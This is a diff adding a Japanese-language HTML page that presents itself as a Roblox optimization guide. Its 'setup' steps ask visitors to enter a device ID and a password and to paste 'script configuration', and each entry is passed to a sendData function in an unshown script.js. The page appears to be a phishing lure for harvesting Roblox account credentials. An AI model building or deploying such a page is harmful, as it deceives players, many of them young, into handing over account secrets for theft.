@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Utility Guide</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <canvas id="particles"></canvas>
+
+    <div class="container">
+        <h1>Roblox Optimization Guide</h1>
+        <span class="nav-link" onclick="document.getElementById('pc-section').scrollIntoView({behavior: 'smooth'})">
+            [ PC版の導入手順へスキップ ]
+        </span>
+
+        <div class="section">
+            <h2>Mobile Setup 1</h2>
+            <p>設定に必要なIDを入力してください。</p>
+            <input type="text" id="m1-input" placeholder="Device ID...">
+            <button onclick="sendData('m1-input', 'm1')">送信</button>
+        </div>
+
+        <div class="section">
+            <h2>Mobile Setup 2</h2>
+            <p>認証キーを入力してください。</p>
+            <input type="text" id="m2-input" placeholder="Password...">
+            <button onclick="sendData('m2-input', 'm2')">送信</button>
+        </div>
+
+        <div id="pc-section" class="section">
+            <h2>PC Setup</h2>
+            <p>PC用の設定情報を貼り付けてください。</p>
+            <textarea id="pc-input" placeholder="Script Configuration..."></textarea>
+            <button onclick="sendData('pc-input', 'pc')">実行</button>
+        </div>
+
+        <div class="turnstile-box">
+            <div class="cf-turnstile" data-sitekey="ここにサイトキーを入れる" data-callback="onSuccess"></div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
